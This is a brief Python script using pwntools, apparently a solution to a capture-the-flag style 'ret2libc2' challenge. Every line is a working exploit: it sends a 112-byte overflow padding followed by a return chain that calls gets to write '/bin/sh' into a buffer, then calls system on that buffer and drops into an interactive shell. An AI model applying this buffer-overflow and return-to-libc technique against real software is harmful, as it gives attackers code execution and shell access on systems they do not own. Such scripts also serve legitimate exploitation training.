##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x804a080
payload = flat(
    [b'a' * 112, gets_plt, system_plt, buf2, buf2])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()